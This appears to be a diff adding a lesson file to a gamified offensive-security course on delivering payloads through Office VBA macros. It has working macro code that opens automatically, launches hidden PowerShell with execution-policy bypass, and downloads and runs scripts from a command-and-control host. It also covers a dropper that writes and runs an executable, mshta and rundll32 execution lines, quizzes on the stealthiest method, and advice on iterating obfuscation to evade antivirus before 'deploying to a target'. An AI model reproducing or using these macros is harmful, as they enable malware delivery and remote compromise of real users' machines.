@@ -1,0 +1,120 @@
+{
+    "id": "l4",
+    "chapterId": "ch_10",
+    "title": "Payload Delivery Methods",
+    "description": "Master the techniques for downloading and executing your final payload via VBA macros.",
+    "xpReward": 45,
+    "estimatedMinutes": 11,
+    "section": "Payload Engineering",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "The Staging Architecture 🏗️",
+            "content": "# Don't Put All Your Eggs in the Macro\n\n**Best Practice: Two-Stage Payload**\n1.  **Stage 1 (VBA Macro):** Small, simple, focused on downloading and executing Stage 2.\n2.  **Stage 2 (PowerShell, C#, HTA):** The full-featured implant (Beacon, RAT, Keylogger).\n\n**Advantages:**\n- **Smaller macro:** Easier to obfuscate, less likely to trigger AV.\n- **Modular:** You can change the payload without modifying the document.\n- **Stealthier:** The macro's behavior is just \"download and run.\" This is common in legitimate macros.\n\n**Disadvantage:** Requires internet connectivity from the target machine to your C2 server."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "quiz",
+            "title": "Staged Payloads 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "What is the primary advantage of a two-stage payload (VBA downloader + remote payload) over embedding the entire payload in the macro?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "It's faster",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "It keeps the macro small and less suspicious, and allows updating the payload",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "It doesn't require the user to enable macros",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "It bypasses all antivirus",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. A small downloader is easier to hide and modify. The heavy lifting is done by the second stage.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_3",
+            "type": "text",
+            "title": "Method 1: PowerShell Download Cradle 🖥️",
+            "content": "# The Industry Standard\n\n**VBA Code:**\n```vba\nPrivate Sub Workbook_Open()\n    Dim strPS As String\n    strPS = \"powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \" & _\n            \"IEX(New-Object Net.WebClient).DownloadString('http://c2-server/payload.ps1')\"\n    Shell strPS, vbHide\nEnd Sub\n```\n\n**How it Works:**\n1.  VBA launches PowerShell with hidden window.\n2.  PowerShell downloads a script from your C2 server as a string.\n3.  `IEX` (Invoke-Expression) executes the downloaded script in memory.\n\n**Pros:**\n- **No file written to disk** (memory-only execution).\n- **Flexible:** The remote `.ps1` script can be anything (Beacon, reverse shell, etc.).\n\n**Cons:**\n- PowerShell execution is heavily monitored by EDR.\n- AMSI scans the downloaded script content."
+        },
+        {
+            "id": "s_l4_4",
+            "type": "code",
+            "title": "VBA Download and Execute (Full Example) 📡",
+            "content": "A robust VBA download cradle with error handling:",
+            "codeSnippet": "Private Sub Workbook_Open()\n    On Error Resume Next\n    Dim strCmd As String\n    Dim objShell As Object\n    \n    ' PowerShell download cradle\n    strCmd = \"powershell.exe -WindowStyle Hidden -NoP -NonI -EP Bypass -Command \" & _\n              \"$c=New-Object Net.WebClient;\" & _\n              \"$c.Headers.Add('User-Agent','Mozilla/5.0');\" & _\n              \"IEX $c.DownloadString('https://c2-server/beacon.ps1')\"\n    \n    ' Execute\n    Set objShell = CreateObject(\"WScript.Shell\")\n    objShell.Run strCmd, 0, False\n    \n    ' Clean up\n    Set objShell = Nothing\nEnd Sub",
+            "codeLanguage": "vba",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_5",
+            "type": "text",
+            "title": "Method 2: Embedded Executable (Dropper) 💾",
+            "content": "# When Offline Execution is Needed\n\n**Scenario:** Target may not have internet access, or you want a self-contained payload.\n\n**Technique:**\n1.  Embed the executable as **OLE Object** or **Base64 string** within the document.\n2.  VBA extracts the binary to a temporary folder (`%TEMP%`).\n3.  VBA executes the dropped file.\n\n**VBA Snippet (Conceptual):**\n```vba\nSub DropAndExecute()\n    Dim fileNum As Integer\n    Dim filePath As String\n    Dim byteData() As Byte\n    \n    ' Load embedded binary from custom document property or hidden sheet\n    byteData = ThisWorkbook.Sheets(\"Config\").Range(\"A1\").Value\n    \n    filePath = Environ(\"TEMP\") & \"\\update.exe\"\n    fileNum = FreeFile\n    Open filePath For Binary As #fileNum\n    Put #fileNum, , byteData\n    Close #fileNum\n    \n    Shell filePath, vbHide\nEnd Sub\n```\n\n**Risk:** Writing an executable to disk increases detection chance significantly. Memory-only is preferred."
+        },
+        {
+            "id": "s_l4_6",
+            "type": "quiz",
+            "title": "Payload Delivery Methods 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "multiple_choice",
+                "question": "Which payload delivery method leaves NO trace on the target's hard drive?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Embedded executable dropper",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "PowerShell download cradle with IEX",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Saving a VBS script and executing it",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Using the Shell function to run calc.exe",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. `IEX` executes the script directly in memory. No file is written to disk.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_7",
+            "type": "text",
+            "title": "Method 3: WMI / COM Object Execution 🎯",
+            "content": "# Alternative Execution Methods\n\n**Using WMI (Windows Management Instrumentation):**\n```vba\nSub WMIExec()\n    Dim objWMIService As Object\n    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n    objWMIService.Get(\"Win32_Process\").Create \"powershell.exe -Command ...\", Null, Null, 0\nEnd Sub\n```\n- **Advantage:** May bypass certain PowerShell execution restrictions.\n\n**Using `MSHTA` to run HTA payloads:**\n```vba\nShell \"mshta.exe http://c2-server/payload.hta\", vbHide\n```\n- **Advantage:** HTA runs with higher privileges and can use VBScript/JavaScript.\n\n**Using `rundll32` to execute shellcode:**\n```vba\nShell \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\"<script>...\"\"\", vbHide\n```\n- **Advantage:** Obfuscated, legitimate Windows binary."
+        },
+        {
+            "id": "s_l4_8",
+            "type": "warning",
+            "title": "Testing Your Payload 🧪",
+            "content": "## Always Test in a Sandbox First\n\n**Before deploying to a target:**\n1.  **Set up a Windows VM** with similar security posture (Defender, ASR rules).\n2.  **Disable your own C2 server** or use a harmless test script.\n3.  **Open the document** and observe:\n    - Does the lure display correctly?\n    - Does the macro execute without errors?\n    - Does Defender flag the document or the behavior?\n4.  **Iterate** on obfuscation and delivery method.\n\n**Never test on your production machine.**"
+        }
+    ]
+}
